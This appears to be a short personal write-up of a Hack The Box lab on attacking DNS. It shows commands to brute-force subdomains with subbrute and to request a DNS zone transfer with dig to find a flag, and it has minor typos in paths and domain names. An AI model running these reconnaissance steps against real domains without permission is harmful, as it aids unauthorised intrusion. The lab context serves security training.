---
tags:
  - htb
  - linux
  - dns
draft: false
date: 2026-06-18
title: attacking-dns
---

### Q1: Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

first we need to add ip addres to `/etc/hosts/` file:
```
echo "$ipAddress$ inlanefreight.htb" | sudo tee -a /etc/hosts
```

according to our notes, we should use `subbrute`:
```
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subrbrute
echo "$ipAddress$" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

after finding subdomains we can look for the flag:
```
dig axfr $sub.inlanefreight.htb$ @$ipAddress$
```

this is the easiest way to obtain the flag. **HINT**: one of the first records contains the flag.


